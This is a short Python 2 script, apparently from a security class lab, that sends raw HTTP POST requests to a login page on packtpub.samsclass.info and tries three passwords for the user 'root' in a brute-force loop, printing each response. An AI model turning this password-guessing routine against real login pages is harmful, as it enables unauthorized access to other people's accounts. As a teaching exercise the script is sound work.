import socket
s = socket.socket()
s.settimeout(2)

target = 'packtpub.samsclass.info'
s.connect((target, 80))

username = "root"
password = "password"

req1 = """POST /http/login1.php HTTP/1.1
Host: packtpub.samsclass.info
Connection: keep-alive
Content-Length: """

req2 = """
Cache-Control: max-age=0
Origin: http://packtpub.samsclass.info
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://packtpub.samsclass.info/http/login1.htm
Accept-Language: en-US,en;q=0.8
Cookie: __cfduid=d9bcadd4725c25185e7270b90dc73eb101466470070

"""

for password in ['passworb', 'passworc', 'password']:
   length = len(username) + len(password) + 5

   req = req1 + str(length) + req2 + "u=" + username + "&p=" + password

   print 'Sending: '
   print req
   s.send(req)

   print 'Received: '
   print s.recv(1024)

s.close()

